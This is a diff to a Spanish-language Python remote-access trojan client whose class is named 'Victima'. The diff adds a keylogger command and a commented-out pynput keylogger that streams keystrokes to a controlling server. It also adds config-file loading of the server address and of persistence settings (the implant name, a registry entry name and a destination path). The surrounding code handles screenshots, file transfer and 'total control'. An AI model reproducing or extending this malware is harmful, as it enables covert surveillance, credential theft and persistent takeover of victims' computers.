@@ -13,6 +13,7 @@ import platform
 import datetime
 import threading
 import subprocess
+import configparser
 #import pyscreenshot
 import urllib.request
 from getpass import getuser
@@ -161,6 +162,9 @@ class Victima(object):
 
 			elif (datosEleccion=="screenshot"):
 				self.screenshot()
+
+			elif (datosEleccion=="keylogger"):
+				self.keylogger()
 
 			# RED	
 
@@ -318,6 +322,29 @@ class Victima(object):
 		return
 
 
+	# def keylogger(self):
+
+	# 	from pynput.keyboard import Key, Listener
+		
+	# 	def on_press(key):
+	# 		self.enviar(str(key))
+
+	# 		datos = self.recibir()
+
+	# 		if (datos=="detener"):
+	# 			return False
+
+
+
+	# 	with Listener(on_press=on_press) as listener:
+	# 	    listener.join()
+
+
+	# 	self.enviar('listo')
+
+	# 	return
+
+
 	# ARCHIVOS	
 
 	def subir_archivos(self):
@@ -442,13 +469,24 @@ class Victima(object):
 
 
 
-def main(direccion,puerto):
+def main(configuraciones):
 
-	s = Victima(direccion,puerto)	
+	s = Victima(configuraciones[0][0],configuraciones[0][1])	
 	s.iniciar()
 	s.enviar_informacion()
 	s.control_total()
 
 if __name__ == '__main__':
-   
-   main("192.168.0.15",9000)
+	
+	configuracion = configparser.ConfigParser()
+	configuracion.read("client.conf")
+
+	seccionConectar = configuracion["CONECTAR"]
+	seccionPersistencia = configuracion["PERSISTENCIA"]
+	
+	conectar = [seccionConectar["Servidor"],seccionConectar["Puerto"]]
+	persistencia = [seccionPersistencia["NombreBicho"],seccionPersistencia["NombreRegistro"],seccionPersistencia["RutaDestino"]]
+
+	configuraciones = [conectar,persistencia]
+
+	main(configuraciones)
